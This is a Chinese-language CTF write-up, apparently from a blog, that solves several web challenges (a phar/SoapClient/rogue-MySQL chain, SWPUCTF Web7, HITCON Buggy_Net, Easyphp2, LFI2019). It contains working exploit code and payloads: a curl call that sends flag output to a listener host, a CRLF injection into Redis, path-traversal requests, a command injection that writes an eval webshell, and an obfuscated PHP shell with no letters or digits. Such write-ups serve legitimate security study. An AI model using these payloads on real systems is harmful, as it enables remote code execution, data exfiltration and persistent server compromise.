+
+![](https://img.npfs06.top/20210327221533.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+既然可以这么触发，那么 Rogue Mysql 的攻击当然适用于 phar 反序列化了。
+
+```
+$reflect = new ReflectionClass('Mysqli');
+$sql = $reflect->newInstanceArgs();
+
+$reflectionMethod = new ReflectionMethod('Mysqli', 'init');
+$reflectionMethod->invoke($sql, $arr);
+
+$reflectionMethod = new ReflectionMethod('Mysqli', 'real_connect');
+$reflectionMethod->invoke($sql, 'ip','root','123456','test','3306');
+
+$reflectionMethod = new ReflectionMethod('Mysqli', 'query');
+$reflectionMethod->invoke($sql, 'select 1');
+```
+
+先给exp
+
+```php
+<?php
+class File{
+    public $file_name;
+    public $func;
+
+    function __construct(){
+        $this->func='SoapClient';
+
+        $target = "http://127.0.0.1/admin.php";
+        $post_string = 'admin=&cmd=curl http://xxx.xxx.xxx.xxx:2333/?`/readflag`&clazz=SplStack&func1=push&func2=push&func3=push&arg1=123456&arg2=123456&arg3='. "\r\n";
+        $headers = [];
+        $this->file_name=[
+            null,
+            array('location' => $target,
+                'user_agent'=>str_replace('^^', "\r\n",'w4nder^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string.'^^')
+                ,'uri'=>'hello')
+        ];
+    }
+}
+$a=new File();
+echo urlencode(serialize($a));
+@unlink("1.phar");
+$phar = new Phar("1.phar"); //后缀名必须为phar
+$phar->startBuffering();
+$phar->setStub("<script language='php'> __HALT_COMPILER(); </script>"); //设置stub
+$phar->setMetadata($a); //将自定义的meta-data存入manifest
+$phar->addFromString("test.txt", "test"); //添加要压缩的文件
+//签名自动计算
+$phar->stopBuffering();
+rename('1.phar','1.jpg');
+```
+
+生成phar上传，然后来到func.php，可以用php://filter/resource=phar://绕过过滤，输入： 
+
+> php://filter/resource=phar://upload/xxxxxxxxxxx/xxxxxxxxxxx.jpg
+
+同时开启监听，即可得到flag
+
+总的来说就是，想要读到 flag 就必须反序列化 Ad 类，可以利用的反序列化只有 phar。而 Ad 类是实现 MySQL 连接的地方，这就可以使用 MySQL 客户端攻击，让 admin.php 连接到一个伪造的 MySQL 服务端，然后在这个伪造的服务端用 phar:// 读取 phar 文件，从而触发 Ad() 类的反序列化。
+
+要想让 admin.php 连接伪造的 MySQL 服务端，就要让 REMOTE_ADDR 为 127.0.0.1，即本地访问，而在 File 类中的 __wakeup() 恰好可以提供 Soap Client 反序列化实现 SSRF，接下来就是如何让 File() 类反序列化。
+
+可以看到 File() 类的 getMIME() 函数使用了 finfo_file() 函数，这个函数可以触发 phar 反序列化，但是在 fuc.php `不能传 phar:// 开头的字符串`，这里就可以使用 `php://filter/resource=......` 进行绕过，而对于文件内容不能有 `<?` 则可以使用 `<script language='php'>__HALT_COMPILER();</script>` 绕过
+
+整体就是通过 File 触发 Soap 访问 admin.php，接着触发 Mysql Client Attack，再触发 phar 即可
+
+参考：https://v2as.com/article/dc469a53-27f0-4695-bd51-677f690190d3
+
+
+
+
+
+## [SWPUCTF 2016]Web7
+
+源码
+
+```python
+#!/usr/bin/python 
+# coding:utf8
+import cherrypy
+import urllib2
+import redis
+
+class web7:
+    @cherrypy.expose
+    def index(self):
+        return "<script> window.location.href='/input';</script>"
+    @cherrypy.expose
+    def input(self,url="",submit=""):
+        file=open("index.html","r").read()
+        reheaders=""
+        if cherrypy.request.method=="GET":
+            reheaders=""
+        else:
+            url=cherrypy.request.params["url"]
+            submit=cherrypy.request.params["submit"]
+            try:
+                for x in urllib2.urlopen(url).info().headers:
+                    reheaders=reheaders+x+"<br>"
+            except Exception,e:
+                reheaders="错误"+str(e)
+            for x in urllib2.urlopen(url).info().headers:
+                reheaders=reheaders+x+"<br>"
+        file=file.replace("<?response?>",reheaders)
+        return file
+    @cherrypy.expose
+    def login(self,password="",submit=""):
+        pool = redis.ConnectionPool(host='127.0.0.1', port=6379)
+        r = redis.Redis(connection_pool=pool)
+        re=""
+        file=open("login.html","r").read()
+        if cherrypy.request.method=="GET":
+            re=""
+        else:
+            password=cherrypy.request.params["password"]
+            submit=cherrypy.request.params["submit"]
+            if r.get("admin")==password:
+                re=open("flag",'r').readline()
+            else:
+                re="Can't find admin:"+password+",fast fast fast....."
+        file=file.replace("<?response?>",re)
+        return file
+cherrypy.config.update({'server.socket_host': '0.0.0.0',
+                        'server.socket_port': 8080,
+                       })
+cherrypy.quickstart(web7(),'/')
+```
+
+两个页面，一个`/input`允许我们输入URL，然后会用urllib2.urlopen()访问我们的URL。还有一个`/login`，要求我们输入管理员的密码,如果与Redis数据库中的密码相同，我们就可以拿到Flag
+
+![](https://img.npfs06.top/20210328181734.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+![](http://img.npfs06.top/20210328181758.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+<a href="https://bugs.python.org/issue30458" target="_blank">CVE-2019-9947</a>
+
+![](https://img.npfs06.top/20210328182806.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+简单来说，就是urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容
+
+也就是说，我们就可以通过%0d%0a去构造一个新的HTTP请求。
+
+思路：向Redis写数据，改掉admin的密码。Redis改数据用set指令。然后换行用%0d%0a。所以，Payload：`http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo` 
+
+```
+
+GET / HTTP/1.1
+Accept-Encoding: identity
+Host: 127.0.0.1
+ 
+set admin admin
+Host: 127.0.0.1
+Connection: close
+User-Agent: Python-urllib/2.7
+```
+
+
+
+然后我们登录/login，输入admin就可以了。不过动作要快，因为admin密码会定时修改。
+
+
+
+## \[Windows][HITCON 2019]Buggy_Net
+
+hint:flag在c:/FLAG.txt
+
+给了源码，主要部分如下
+
+```c#
+
+    bool isBad = false;
+    try {
+        if ( Request.Form["filename"] != null ) {
+            isBad = Request.Form["filename"].Contains("..") == true;
+        }
+    } catch (Exception ex) {
+        
+    } 
+
+    try {
+        if (!isBad) {
+            Response.Write(System.IO.File.ReadAllText(@"C:\inetpub\wwwroot\" + Request.Form["filename"]));
+        }
+    } catch (Exception ex) {
+
+    }
+```
+
+首先`isBad`为`false`，如果POST的文件名包含`..`的话，`isBad`就会为`true`，就读不了文件了。
+
+所以这里要bypass`..`去读取文件
+
+So lets ask Google if there are any known bugs in ASP.NET …
+
+The basic idea of that vulnerability is that, for POST requests, request validation prevents “dangerous content” (e.g. HTML tags or similar, such as `<x`) in *POST form fields* by terminating the whole application. However, the same content in query-string fields will pass initial request validation and will “only” raise an exception on first access of `Request.QueryString[...]` (since that field is populated on first access?)
+
+Similarly, for GET requests, request validation prevents “dangerous content” (e.g. HTML tags or similar, such as `<x`) in *GET query-string fields* by terminating the whole application. However, the same content in form fields (i.e. in a request body encoded as `application/x-www-form-urlencoded`) will pass initial request validation and will “only” raise an exception on first access of `Request.Form[...]` (again, since that field is populated on first access?)
+
+Nevertheless, query-string fields in a POST request are accessbile through `Request.QueryString[...]` and form fields submitted in the *request body* of a **GET** request (with content-type `application/x-www-form-urlencoded`) are accessible through `Request.Form[...]`.
+
+Hence, we should be able to successfully submit the form by the sending a **GET** request without any query-string field but with the filename field in the **request body**. Further, by also including another form field in the request body that will trigger that “late” request validation bug (or is it a feature if Microsoft declared to won’t fix? 😜), e.g. a simple `&o=<x`, we should be able to trigger an exception on first access of `Request.Form["filename"]` … and this is exactly what we need to escape from the first try-catch-block before changing `isBad`.
+
+
+
+payload:
+
+```
+GET / HTTP/1.1
+Host: 52.197.162.211
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+Referer: http://52.197.162.211/
+
+filename=%2E%2E%5C%2E%2E%5CFLAG.txt&o=%3Cx
+```
+
+
+
+
+
+## [羊城杯 2020]Easyphp2
+
+伪协议文件读取，有waf，通过二次编码绕过
+
+```php
+<?php
+$char = 'b'; #构造r的二次编码
+for ($ascii1 = 0; $ascii1 < 256; $ascii1++) {
+	for ($ascii2 = 0; $ascii2 < 256; $ascii2++) {
+		$aaa = '%'.$ascii1.'%'.$ascii2;
+		if(urldecode(urldecode($aaa)) == $char){
+			echo $char.': '.$aaa;
+			echo "\n";
+		}
+	}
+}
+?>
+//b: %6%32
+```
+
+> ?file=php://filter/read=convert.%62ase64-encode/resource=GWHT.php
+
+```php+HTML
+
+    <?php
+    ini_set('max_execution_time', 5);
+
+    if ($_COOKIE['pass'] !== getenv('PASS')) {
+        setcookie('pass', 'PASS');
+        die('<h2>'.'<hacker>'.'<h2>'.'<br>'.'<h1>'.'404'.'<h1>'.'<br>'.'Sorry, only people from GWHT are allowed to access this website.'.'23333');
+    }
+    ?>
+
+ 
+
+    <?php
+    if (isset($_GET["count"])) {
+        $count = $_GET["count"];
+        if(preg_match('/;|base64|rot13|base32|base16|<\?php|#/i', $count)){
+        	die('hacker!');
+        }
+        echo "<h2>The Count is: " . exec('printf \'' . $count . '\' | wc -c') . "</h2>";
+    }
+    ?>
+
+
+```
+
+通过robots.txt知道还有个check.php页面，同理读源码
+
+```php
+<?php
+$pass = "GWHT";
+// Cookie password.
+echo "Here is nothing, isn't it ?";
+
+header('Location: /');
+
+```
+
+抓个包看下
+
+![](https://img.npfs06.top/20210330194306.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+我们把这里的PASS改为GWHT
+
+接下来就是命令执行exec(‘printf ‘’ . $count . ‘’ | wc -c’)，exec命令无回显，可以直接写入shell
+
+```php
+'|echo+"<%3f%3d+eval(\$_POST['shell'])%3f>"+>+a.php'
+  
+ //exec('printf \'''|echo+"<%3f%3d+eval(\$_POST['shell'])%3f>"+>+a.php''\' | wc -c') 
+```
+
+![](http://img.npfs06.top/20210330195657.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+蚁剑链接
+
+![](https://img.npfs06.top/20210330195725.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+看了wp发现预期解是
+
+发现了flag的所在地，但是没有权限，需要用GWHT或者root用户的权限才行。根目录下有一个`GWHT` 目录，
+
+```
+www-data@b3beb2760c83:/var/www/html$ ls /GWHT
+ls /GWHT
+README
+avenged
+dream
+findaas
+led
+system
+```
+
+在README中得到hash
+
+```
+877862561ba0162ce610dd8bf90868ad414f0ec6.
+```
+
+解得为：GWHTCTF
+
+直接就能看flag了
+
+```linux
+www-data@b3beb2760c83:/var/www/html$ su - GWHT
+su - GWHT
+Password: GWHTCTF
+cat flag.txt
+```
+
+
+
+## [Windows]LFI2019
+
+找不到源码，直接上github找的源码
+
+```php+HTML
+<?php
+
+    /*
+        Developed by stypr.
+        Made in 2018, Releasing in 2019!
+    */
+
+    // Baka flag-sama and seed-chan! //
+    error_reporting(0);
+    ini_set("display_errors","off");
+    @require('flag.php');
+    $seed = md5(rand(PHP_INT_MIN,PHP_INT_MAX));
+
+    if($flag === $_GET['trigger']){
+        die(hash("sha256", $seed . $flag));
+    }
+
+    // Sessions are never used but we add that //
+    ini_set('session.cookie_httponly', 1); @phpinfo();
+    ini_set('session.cookie_secure', 1); @phpinfo();
+    ini_set('session.use_only_cookies',1); @phpinfo();
+    ini_set('session.gc_probability', 1); @phpinfo();
+    // but really, you can't really do something with sessions. //
+    session_save_path('./sess/');
+    session_name("lfi2019");
+    session_start();
+    session_destroy();
+
+    // Flush directory for security purposes //
+    // Referenced it from StackOverflow: https://bit.ly/2MxvxXE //
+    function rrmdir($dir, $depth=0){ 
+        if (is_dir($dir)){
+            $objects = scandir($dir); 
+            foreach ($objects as $object){ 
+                if ($object != "." && $object != ".."){ 
+                    if(is_dir($dir."/".$object))
+                        rrmdir($dir."/".$object, $depth + 1);
+                    else
+                        unlink($dir."/".$object); 
+                }
+            }
+        }
+        if($depth != 0) rmdir($dir); 
+    }
+    function countdir($dir){
+        if (is_dir($dir)){
+            $objects = scandir($dir);
+            foreach ($objects as $object){ 
+                if ($object != "." && $object != ".."){ 
+                    $count += 1;
+                    if(is_dir($dir."/".$object))
+                        $count += countdir($dir."/".$object);
+                }
+            }
+        }
+        return $count;
+    }
+    var_dump(countdir("./files"));
+    if(countdir("./files/") >= 100) @rrmdir("./files/");
+
+    // Here, kawaii path-san for you! //
+    function path_sanitizer($dir, $harden=false){
+        $dir = (string)$dir;
+        $dir_len = strlen($dir);
+        // Deny LFI/RFI/XSS //
+        $filter = ['.', './', '~', '.\\', '#', '<', '>'];
+        foreach($filter as $f){
+            if(stripos($dir, $f) !== false){
+                return false;
+            }
+        }
+        // Deny SSRF and all possible weird bypasses //
+        $stream = stream_get_wrappers();
+        $stream = array_merge($stream, stream_get_transports());
+        $stream = array_merge($stream, stream_get_filters());
+        foreach($stream as $f){
+            $f_len = strlen($f);
+            if(substr($dir, 0, $f_len) === $f){
+                return false;
+            }
+        }
+        // Deny length //
+        if($dir_len >= 128){
+            return false;
+        }
+		// Easy level hardening //
+		if($harden){
+			$harden_filter = ["/", "\\"];
+			foreach($harden_filter as $f){
+				$dir = str_replace($f, "", $dir);
+			}
+		}
+
+        // Sanitize feature is available starting from the medium level //
+        return $dir;
+    }
+
+    // The new kakkoii code-san is re-implemented. //
+    function code_sanitizer($code){
+        // Computer-chan, please don't speak english. Speak something else! //
+        $code = preg_replace("/[^<>!@#$%\^&*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u", "*Nope*", (string)$code);
+        return $code;
+    }
+
+    // Errors are intended and straightforward. Please do not ask questions. //
+    class Get {
+        protected function nanahira(){
+            // senpai notice me //
+            function exploit($data){
+                $exploit = new System();
+            }
+            $_GET['trigger'] && !@@@@@@@@@@@@@exploit($$$$$$_GET['leak']['leak']);
+        }
+        private $filename;
+        function __construct($filename){
+            $this->filename = path_sanitizer($filename);
+        }
+        function get(){
+            if($this->filename === false){
+                return ["msg" => "blocked by path sanitizer", "type" => "error"];
+            }
+            // wtf???? //
+            if(!@file_exists($this->filename)){
+                // index files are *completely* disabled. //
+                if(stripos($this->filename, "index") !== false){
+                    return ["msg" => "you cannot include index files!", "type" => "error"];
+                }
+
+                // hardened sanitizer spawned. thus we sense ambiguity //
+                $read_file = "./files/" . $this->filename;
+                $read_file_with_hardened_filter = "./files/" . path_sanitizer($this->filename, true);
+
+                if($read_file === $read_file_with_hardened_filter ||
+                    @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){
+                    return ["msg" => "request blocked", "type" => "error"];
+                }
+                // .. and finally, include *un*exploitable file is included. //
+                @include("./files/" . $this->filename);
+                return ["type" => "success"];
+            }else{
+                return ["msg" => "invalid filename (wtf)", "type" => "error"];
+            }
+        }
+    }
+    class Put {
+        protected function nanahira(){
+            // senpai notice me //
+            function exploit($data){
+                $exploit = new System();
+            }
+            $_GET['trigger'] && !@@@@@@@@@@@@@exploit($$$$$$_GET['leak']['leak']);
+        }
+        private $filename;
+        private $content;
+        private $dir = "./files/";
+        function __construct($filename, $data){
+            global $seed;
+            if((string)$filename === (string)@path_sanitizer($data['filename'])){
+                $this->filename = (string)$filename;
+            }else{
+                $this->filename = false;
+            }
+            $this->content = (string)@code_sanitizer($data['content']);
+        }
+        function put(){
+            // just another typical file insertion //
+            if($this->filename === false){
+                return ["msg" => "blocked by path sanitizer", "type" => "error"];
+            }
+            // check if file exists //
+            if(file_exists($this->dir . $this->filename)){
+                return ["msg" => "file exists", "type" => "error"];
+            }
+            file_put_contents($this->dir . $this->filename, $this->content);
+            // just check if file is written. hopefully. //
+            if(@file_get_contents($this->dir . $this->filename) == ""){
+                return ["msg" => "file not written.", "type" => "error"];
+            }
+            return ["type" => "success"];
+        }
+    }
+
+    // Triggering this is nearly impossible //
+    class System {
+        function __destruct(){
+            global $seed;
+            // ain't Argon2, ain't pbkdf2. what could go wrong?
+            $flag = hash('sha256', $seed);
+            if($_GET[$flag]){
+                @system($_GET[$flag]);
+            }else{
+                @unserialize($_SESSION[$flag]);
+            }
+        }
+    }
+
+    // Don't call me a savage... I gave everything you need //
+    if($_SERVER['QUERY_STRING'] === "show-me-the-hint"){
+        show_source(__FILE__);
+        exit;
+    }
+
+    // XSS protection and hints ^-^ //
+    header('X-Hint: /index.php?show-me-the-hint');
+    header('X-Frame-Options: DENY');
+    header('X-XSS-Protection: 1; mode=block;');
+    header('X-Content-Type-Options: nosniff');
+    header('Content-Type: text/html; charset=utf-8');
+    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+
+    //header("Content-Security-Policy: default-src 'self'; script-src 'nonce-${seed}' 'unsafe-eval';" .
+    //"font-src 'nonce-${seed}' fonts.gstatic.com; style-src 'nonce-${seed}' fonts.googleapis.com;");
+
+    // Hello, JSON! //
+    $parsed_url = explode("&", $_SERVER['QUERY_STRING']);
+    if(count($parsed_url) >= 2){
+        header("Content-Type:text/json");
+        switch($parsed_url[0]){
+            case "get":
+                $get = new Get($parsed_url[1]);
+                $data = $get->get();
+                break;
+            case "put":
+                $put = new Put($parsed_url[1], $_POST);
+                $data = $put->put();
+                break;
+            default:
+                $data = ["msg" => "Invalid data."];
+                break;
+        }
+        die(json_encode($data));
+    }
+?>
+
+```
+
+代码主要分为三个部分
+
+**过滤函数：**
+
+![](https://img.npfs06.top/20210331191241.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+对文件名和文件内容的waf
+
+**PUT类：**
+
+![](https://img.npfs06.top/20210331190910.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+put类可以进行写文件操作，文件名可控但是要经过path_sanitizer过滤，然后拼接写在files目录下，path_sanitizer函数会过滤
+
+```
+  $filter = ['.', './', '~', '.\\', '#', '<', '>'];
+```
+
+写的内容也可控，但是要过这个正则
+
+```php
+preg_replace("/[^<>!@#$%\^&*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u", "*Nope*", (string)
+```
+
+**GET类**
+
+![](https://img.npfs06.top/20210331195107.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+get类可以进行文件读取，并且在最后面有个include操作，所以猜侧具体思路是写文件，然后用include包含执行。
+传入文件名和PUT类类似，可控，但是要经过path_sanitizer函数过滤，并且也会在前面自动拼接./files/。不过有一点不同之处，如下
+
+```php
+$read_file = "./files/" . $this->filename;
+$read_file_with_hardened_filter = "./files/" . path_sanitizer($this->filename, true);
+```
+
+这里path_sanitizer函数第二个参数为真，会在原过滤的基础上把正反斜杠替换为空
+经过两种过滤方式输出的文件名和文件内容都必须不一样，否者就直接返回了，这段代码通过后就会`@include("./files/" . $this->filename);`，所以我们只要绕过这个if判断就可以包含了
+
+
+
+对于Windows的文件读取，有一个小Trick：使用`FindFirstFile`这个API的时候，其会把`"`解释为`.`。意即：`shell"php` === `shell.php`。
+
+因此，回到这题来。我们上传一个文件，名字设为`test`。然后，通过`"/test`即可读取。此时：
+
+```
+$read_file = "./files/./test";
+$read_file_with_hardened_filter = "./files/.test";
+file_get_contents($read_file) = '实际文件内容';
+file_get_contents($read_file_with_hardened_filter) = false //文件不存在
+```
+
+这样就绕过了文件名的限制
+
+最后就是构建无字母数字shell了<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a>
+
+这里采用异或的方法
+
+```
+<?=$__=("\\"^"(").("\\"^".").(")"^"@").("-"^"@");(("\\"^".").(";"^"^").("\\"^"=").(";"^"_").(";"^"]").("\\"^$__(!@$_+!@$_+!@$_+!@$_+!@$_)).("\\"^$__(!@$_-!@$_)).(";"^"^"))((("\\"^$__(!@$_+!@$_)).(";"^"^").("\\"^"$").("\\"^"("))((((";"^"\\").(";"^"^").("\\"^"(").("\\"^"=").("\\"^$__(!@$_-!@$_)).("\\"^$__(!@$_-!@$_)).("\\"^$__(!@$_+!@$_+!@$_+!@$_)).(";"^"^").("\\"^"=").(";"^"_").(";"^"^").("\\"^".").("]"^"."))())))?>
+```
+
+
+
+```
+%3C%3F%3D%24__%3D(%22%5C%5C%22%5E%22(%22).(%22%5C%5C%22%5E%22.%22).(%22)%22%5E%22%40%22).(%22-%22%5E%22%40%22)%3B((%22%5C%5C%22%5E%22.%22).(%22%3B%22%5E%22%5E%22).(%22%5C%5C%22%5E%22%3D%22).(%22%3B%22%5E%22_%22).(%22%3B%22%5E%22%5D%22).(%22%5C%5C%22%5E%24__(!%40%24_%2B!%40%24_%2B!%40%24_%2B!%40%24_%2B!%40%24_)).(%22%5C%5C%22%5E%24__(!%40%24_-!%40%24_)).(%22%3B%22%5E%22%5E%22))(((%22%5C%5C%22%5E%24__(!%40%24_%2B!%40%24_)).(%22%3B%22%5E%22%5E%22).(%22%5C%5C%22%5E%22%24%22).(%22%5C%5C%22%5E%22(%22))((((%22%3B%22%5E%22%5C%5C%22).(%22%3B%22%5E%22%5E%22).(%22%5C%5C%22%5E%22(%22).(%22%5C%5C%22%5E%22%3D%22).(%22%5C%5C%22%5E%24__(!%40%24_-!%40%24_)).(%22%5C%5C%22%5E%24__(!%40%24_-!%40%24_)).(%22%5C%5C%22%5E%24__(!%40%24_%2B!%40%24_%2B!%40%24_%2B!%40%24_)).(%22%3B%22%5E%22%5E%22).(%22%5C%5C%22%5E%22%3D%22).(%22%3B%22%5E%22_%22).(%22%3B%22%5E%22%5E%22).(%22%5C%5C%22%5E%22.%22).(%22%5D%22%5E%22.%22))())))%3F%3E%0A
+```
+
+
+
+![](https://img.npfs06.top/20210331185008.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
